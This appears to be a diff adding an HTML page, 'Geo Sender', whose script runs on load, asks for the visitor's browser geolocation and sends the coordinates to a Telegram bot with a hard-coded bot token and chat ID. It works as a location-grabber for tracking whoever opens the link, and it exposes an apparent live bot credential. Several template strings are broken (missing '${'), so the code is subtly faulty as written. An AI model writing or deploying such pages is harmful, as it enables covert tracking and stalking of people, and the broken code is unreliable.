@@ -1,0 +1,57 @@
+`html
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Geo Sender</title>
+</head>
+<body>
+  <h2>Определяем вашу геолокацию...</h2>
+  <p id="status">Ожидание разрешения пользователя...</p>
+
+  <script>
+    const BOT_TOKEN = '7414759391:AAHQ_n9ELvC9DG6I7iaXxS0A78LajMTOlfc';
+    const CHAT_ID = '7521102948';
+
+    function sendToTelegram(lat, lon) {
+      const message = `🌍 Новый посетитель\n📌 Широта: lat📌 Долгота:{lon}`;
+      const url = `https://api.telegram.org/botBOT_TOKEN/sendMessage?chat_id={CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+      fetch(url)
+        .then(res => res.json())
+        .then(data => {
+          if (data.ok) {
+            document.getElementById("status").textContent = "✅ Координаты отправлены!";
+          } else {
+            document.getElementById("status").textContent = "❌ Ошибка при отправке.";
+          }
+        })
+        .catch(err => {
+          document.getElementById("status").textContent = "⚠️ Не удалось связаться с Telegram.";
+          console.error(err);
+        });
+    }
+
+    function getLocation() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            sendToTelegram(lat, lon);
+          },
+          (err) => {
+            document.getElementById("status").textContent = "⛔ Доступ к геолокации запрещён.";
+          }
+        );
+      } else {
+        document.getElementById("status").textContent = "❌ Геолокация не поддерживается.";
+      }
+    }
+
+    // Запускаем при открытии страницы
+    getLocation();
+  </script>
+</body>
+</html>
+`
